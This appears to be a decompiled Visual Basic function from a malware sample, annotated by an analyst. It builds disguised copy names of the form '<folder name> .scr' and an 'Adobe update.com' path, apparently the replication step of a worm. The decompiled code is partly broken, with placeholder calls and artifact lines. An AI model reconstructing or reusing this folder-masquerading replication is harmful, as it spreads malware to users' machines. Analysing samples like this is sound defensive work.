Public Function funct4(a, b, c) '404C24
  ' Note: Me.Global.App is an artifact
  'Data Table: 401838
  Dim var_C4 As Variant
  Dim au_path As String
  Dim var_DC As String
  Dim var_120 As Variant

  loc_404A82: On Error Goto loc_404C16 ' Exit on error

  loc_404A90: var_C4 = c And 16

  loc_404AC4: If CBool(CStr(a) And (Thumbs   .db.address_80000268 <> ".")) Then
  loc_404ADA:   decompilation_artifact = Me.Global.App
  loc_404AE2:   App.HelpFile = CStr(a)
  loc_404AFF:   decompilation_artifact = Me.Global.App
  loc_404B16:   folder_name = b & CVar(App.HelpFile) 'Variant
  loc_404B3B:   Thumbs   .db.address_80000210

  loc_404B59:   If CBool(InStr(folder_name, var_120, var_120, 0)) Then
  loc_404B5C:     funct4 = funct1(0)
  loc_404B62:   End If
  loc_404B77:   folder_replicant = folder_name & " " & ".scr" 'Variant. folder_replicant = "<folder name> .scr"

  loc_404B96:   If (Thumbs   .db.address_80000285 <> vbNullString) Then
  loc_404B99:     funct4 = folder_replicant
  loc_404B9F:   End If

                ' Set of calls to the DLL
  loc_404BA7:   au_path = CStr(folder_name)
  loc_404BAB:   Thumbs   .db.address_80000244
  loc_404BC3:   var_DC = CStr(folder_replicant)
  loc_404BE5:   au_path = CStr(funct1(0) & "\" & "Adobe update" & ".com")
  loc_404BE9:   Thumbs   .db.address_80000240
  loc_404C0A:   au_path = CStr(folder_replicant)
  loc_404C0E:   Thumbs   .db.address_80000244
  loc_404C16:   ' Referenced from: 404A82
  loc_404C16: End If

  loc_404C16: funct4 = au_path ' Return the path of the folder replicant
  loc_404C1C: funct4 = 1 ' Return 1?
End Function